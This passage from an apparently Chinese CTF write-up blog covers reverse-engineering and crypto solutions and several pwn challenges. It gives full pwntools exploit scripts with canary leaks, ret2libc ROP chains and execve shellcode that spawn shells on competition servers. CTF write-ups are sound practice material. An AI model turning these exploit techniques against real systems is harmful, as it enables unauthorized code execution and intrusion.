^ (i+<span class="number">1</span>)) <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted)])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;decrypted&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol><h4 id="PaluFlat"><a href="#PaluFlat" class="headerlink" title="PaluFlat"></a>PaluFlat</h4><p>附件为.com文件，改为.zip解压后得到exe文件，</p><p>exe文件丢入ida找到加密逻辑</p><p>输入存入str[]数组中经过sub_40155函数加密后与v5数组比较</p><p>sub_40155加密逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">加密流程按以下顺序进行：</span><br><span class="line"></span><br><span class="line">动态密钥选择：根据字符索引奇偶性交替使用&quot;flat&quot;和&quot;palu&quot;两个密钥</span><br><span class="line">异或混淆：用密钥字节对原始字节进行异或运算</span><br><span class="line">位移混淆：循环右移4位打乱bit位置</span><br><span class="line">数值变换：通过减85改变数值分布</span><br><span class="line">取反混淆：最终通过按位取反实现非线性变换</span><br><span class="line">各步骤说明：</span><br><span class="line"></span><br><span class="line">密钥选择策略：奇数位用flat[0]，偶数位用palu[0]，通过模运算循环使用密钥字符</span><br><span class="line">循环移位实现：(v8 &gt;&gt; 4) | (v8 &lt;&lt; 4) 完成4位右循环</span><br><span class="line">减法操作使用模运算处理溢出，保证结果在0-255范围内</span><br><span class="line">最终取反操作：~v8 &amp; 0xFF 确保结果为有效字节值</span><br><span class="line">这个加密算法通过多阶段非线性变换，实现了对原始字符串的混淆和扩散效果。</span><br></pre></td></tr></table></figure><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_byte</span>(<span class="params">encrypted_byte, key_part, index, key1_len, key2_len</span>):</span><br><span class="line">    <span class="comment"># 逆向操作步骤：取反 → 加85 → 循环移位 → 异或</span></span><br><span class="line">    v8 = ~encrypted_byte &amp; <span class="number">0xFF</span>  <span class="comment"># 逆向取反操作</span></span><br><span class="line">    v8 = (v8 + <span class="number">85</span>) % <span class="number">256</span>        <span class="comment"># 逆向减85操作</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 循环右移4位的逆向操作（同样是循环右移4位，因为两次移位等于原值）</span></span><br><span class="line">    v8 = ((v8 &lt;&lt; <span class="number">4</span>) | (v8 &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 选择密钥（与加密时相同的逻辑）</span></span><br><span class="line">    <span class="keyword">if</span> index % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        key = key_part[<span class="number">0</span>]</span><br><span class="line">        key_len = key1_len</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key = key_part[<span class="number">1</span>]</span><br><span class="line">        key_len = key2_len</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 逆向异或操作</span></span><br><span class="line">    v8 ^= key[index % key_len]</span><br><span class="line">    <span class="keyword">return</span> v8</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_string</span>(<span class="params">encrypted_str</span>):</span><br><span class="line">    key_part = [<span class="string">b&quot;flat&quot;</span>, <span class="string">b&quot;palu&quot;</span>]</span><br><span class="line">    key1_len = <span class="built_in">len</span>(key_part[<span class="number">0</span>])</span><br><span class="line">    key2_len = <span class="built_in">len</span>(key_part[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_str)):</span><br><span class="line">        plain_byte = decrypt_byte(encrypted_str[i], key_part, i, key1_len, key2_len)</span><br><span class="line">        decrypted.append(plain_byte)</span><br><span class="line">    <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修正后的加密数据（包含原C代码中的0x8F）</span></span><br><span class="line">encrypted_str = [</span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x84</span>, <span class="number">0x54</span>, <span class="number">0x44</span>, <span class="number">0xA4</span>, <span class="number">0xB2</span>, <span class="number">0x84</span>, <span class="number">0x54</span>,</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x32</span>, <span class="number">0x8F</span>, <span class="number">0x54</span>, <span class="number">0x62</span>, <span class="number">0xB2</span>, <span class="number">0x54</span>, <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x80</span>, <span class="number">0x43</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密并打印结果</span></span><br><span class="line">decrypted_flag = decrypt_string(encrypted_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Flag:&quot;</span>, decrypted_flag)</span><br></pre></td></tr></table></figure><h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="循环锁链"><a href="#循环锁链" class="headerlink" title="循环锁链"></a>循环锁链</h4><ol><li><strong>确定起点</strong>：已知flag以<code>palu&#123;</code>开头，对应的ASCII值分别为<code>0x70, 0x61, 0x6C, 0x75, 0x7B</code>。</li><li><strong>异或链推导</strong>：发现密文循环结构中，若以索引36（最后一个字节<code>0x0D</code>）为起点，并假设明文通过异或链（每个字节与前一个明文异或）生成，则：<ul><li><code>明文[0] = cipher[36] ^ IV</code>，其中<code>IV = 0x0D ^ 0x70 = 0x7D</code>。</li><li>后续明文满足：<code>明文[i] = cipher[i] ^ 明文[i-1]</code>。</li></ul></li><li><strong>逐字节解密</strong>：从索引36开始循环遍历密文，依次异或前一个明文字节，得到完整明文。</li></ol><p>最终解密结果即为所求flag。</p><p><code>palu&#123;iC7uDoJJMAWnIhkkCNiIoCZZVmiPrk9&#125;</code></p><h4 id="欧几里得："><a href="#欧几里得：" class="headerlink" title="欧几里得："></a>欧几里得：</h4><p>Paillier加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">c = <span class="number">1426774899479339414711783875769670405758108494041927642533743607154735397076811133205075799614352194241060726689487117802867974494099614371033282640015883625484033889861</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有可能的两个字节值</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10000</span>):</span><br><span class="line">    <span class="comment"># 构造两个字节</span></span><br><span class="line">    high = s &gt;&gt; <span class="number">8</span></span><br><span class="line">    low = s &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="comment"># 生成m2的字节串：两个字节重复35次，共70字节</span></span><br><span class="line">    m2_bytes = <span class="built_in">bytes</span>([high, low]) * <span class="number">35</span></span><br><span class="line">    <span class="comment"># 转换为整数</span></span><br><span class="line">    m2 = <span class="built_in">int</span>.from_bytes(m2_bytes, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="comment"># 计算m1候选值</span></span><br><span class="line">    <span class="keyword">if</span> m2 &gt; c:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    m1 = c - m2</span><br><span class="line">    <span class="comment"># 转换为字节</span></span><br><span class="line">    m1_bytes = long_to_bytes(m1)</span><br><span class="line">    <span class="comment"># 检查是否以palu&#123;开头，并且所有字符可打印</span></span><br><span class="line">    <span class="keyword">if</span> m1_bytes.startswith(<span class="string">b&#x27;palu&#123;&#x27;</span>) <span class="keyword">and</span> m1_bytes.endswith(<span class="string">b&#x27;&#125;&#x27;</span>) <span class="keyword">and</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= b &lt;= <span class="number">126</span> <span class="keyword">for</span> b <span class="keyword">in</span> m1_bytes):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found flag:&quot;</span>, m1_bytes.decode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Seed:&quot;</span>, <span class="built_in">hex</span>(s))</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><h2 id="轩辕杯"><a href="#轩辕杯" class="headerlink" title="轩辕杯"></a>轩辕杯</h2><h3 id="it-is-a-canary"><a href="#it-is-a-canary" class="headerlink" title="it_is_a_canary"></a>it_is_a_canary</h3><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>开了PIE开了Canary有后门函数，两个溢出点但是溢出字节数比较少只够覆盖rbp和返回地址</p><p>漏洞函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Is it a canary?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You say: %s.&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is PIE?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先用printf泄露canary，%s会被<code>\x00</code>截断所以用<code>\n</code>覆盖<code>\x00</code>输出canary，用第二个read尝试覆盖vuln的返回地址的后两个字节跳转到后门函数</p><p>多尝试几次就覆盖成功了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;27.25.151.26&#x27;</span>,<span class="number">62873</span>)</span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Is it a canary?&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>))-<span class="number">0xa</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(canary)+ p64(<span class="number">0</span>)  + <span class="string">b&#x27;\x65\x52&#x27;</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="lllibc"><a href="#lllibc" class="headerlink" title="lllibc"></a>lllibc</h3><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>简单的libc</p><p>libc版本：<a href="https://libc.blukat.me/?q=write:870&l=libc6_2.35-0ubuntu3.9_amd64">libc database search</a></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;27.25.151.26&#x27;</span>,<span class="number">29389</span>)</span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./1.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">read = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x000000000040117e</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000401180</span></span><br><span class="line">pop_rdx = <span class="number">0x0000000000401182</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">bss = <span class="number">0x404040</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(write_got) + p64(pop_rdx) + p64(<span class="number">0x10</span>) + p64(write_plt) + p64(main) </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;win?\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;win?\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="国际赛"><a href="#国际赛" class="headerlink" title="国际赛"></a>国际赛</h1><h2 id="squ1rrel-CTF-2025"><a href="#squ1rrel-CTF-2025" class="headerlink" title="squ1rrel CTF 2025"></a>squ1rrel CTF 2025</h2><h3 id="jail"><a href="#jail" class="headerlink" title="jail"></a>jail</h3><p>还不太会分析docker文件就先贴个大佬的exp</p><p>Solved by Winegee：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./prison&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;20.84.72.194&quot;</span>, <span class="number">5001</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./prison&quot;</span>)</span><br><span class="line"><span class="comment"># 0x0000000000401a1a : pop rdx ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000401a0d : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000413676 : pop rsi ; pop rbp ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x401a0d</span></span><br><span class="line">pop_rdx = <span class="number">0x401a1a</span></span><br><span class="line">pop_rsi_rbp = <span class="number">0x413676</span></span><br><span class="line">bss = <span class="number">0x00000000004ccac0</span></span><br><span class="line"><span class="comment"># 0x000000000041f464 : pop rax ; ret</span></span><br><span class="line">pop_rax = <span class="number">0x41f464</span></span><br><span class="line"><span class="comment"># 0x00000000004013b8 : syscall</span></span><br><span class="line">syscall = <span class="number">0x4013b8</span></span><br><span class="line"><span class="comment"># 0x00000000004450f8 : pop rsp ; ret</span></span><br><span class="line">pop_rsp = <span class="number">0x4450f8</span></span><br><span class="line"><span class="comment"># sla(b&quot;They gave you the premium stay so at least you get to choose your cell (1-6): &quot;, str(1))</span></span><br><span class="line">sla(<span class="string">b&quot;They gave you the premium stay so at least you get to choose your cell (1-6): &quot;</span>, <span class="built_in">str</span>(<span class="number">17</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your cellmate is &quot;</span>)</span><br><span class="line">stack_pointer = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">rop_addr = stack_pointer - (<span class="number">0x8b0</span> - <span class="number">0x7c0</span>)</span><br><span class="line">payload = p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_rbp) + p64(rop_addr) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0x200</span>) + p64(elf.sym[<span class="string">&quot;read&quot;</span>]) + p64(<span class="number">0</span>) + p64(pop_rsp) + p64(rop_addr)</span><br><span class="line"><span class="comment"># payload = payload.ljust(, b&quot;\x00&quot;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">sa(<span class="string">b&quot;Now let&#x27;s get the registry updated. What is your name: &quot;</span>, payload)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">b&quot;/bi&quot;</span> + <span class="string">b&quot;/bin/sh\x00&quot;</span> * <span class="number">9</span></span><br><span class="line">payload += p64(pop_rdi) + p64(rop_addr) + p64(pop_rsi_rbp) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">0x3b</span>) + p64(syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># squ1rrel&#123;m4n_0n_th3_rUn_fr0m_NX_pr1s0n!&#125;</span></span><br></pre></td></tr></table></figure><p>Solved by pfwqdxwdd：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process(&quot;./prison&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;20.84.72.194&quot;</span>,<span class="number">5001</span>)</span><br><span class="line">e=ELF(<span class="string">&quot;./prison&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401a0d</span></span><br><span class="line">pop_rdx=<span class="number">0x401a1a</span></span><br><span class="line">xor_rax=<span class="number">0x000000000042bea9</span></span><br><span class="line"></span><br><span class="line">mg0=<span class="number">0x0000000000419501</span></span><br><span class="line"><span class="comment"># add rdx, 0x60; mov rax, qword ptr [rdi]; mov qword ptr [rdx], rax; ret;</span></span><br><span class="line">xor_edi=<span class="number">0x000000000047ddda</span></span><br><span class="line"><span class="comment"># xor edi, edi; mov eax, edi; ret;</span></span><br><span class="line">leave_ret=<span class="number">0x0000000000401b54</span></span><br><span class="line">rdx=<span class="number">0x0000000000471875</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x4cb3a0</span>)+p64(rdx)+p64(xor_edi)+p64(<span class="number">0x000000000042daa6</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x401b55</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">mrotect=<span class="number">0x000000000042e5b0</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 59</span></span><br><span class="line"><span class="string">    mov rdi,0x0068732f6e69622f</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span>+p64(pop_rdi)+p64(<span class="number">0x4cb000</span>)+p64(pop_rdx)+p64(<span class="number">0x7</span>)+p64(<span class="number">0x0000000000413676</span>)+p64(<span class="number">0x1000</span>)*<span class="number">2</span>+p64(mrotect)+p64(<span class="number">0x4cb3f0</span>)+shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
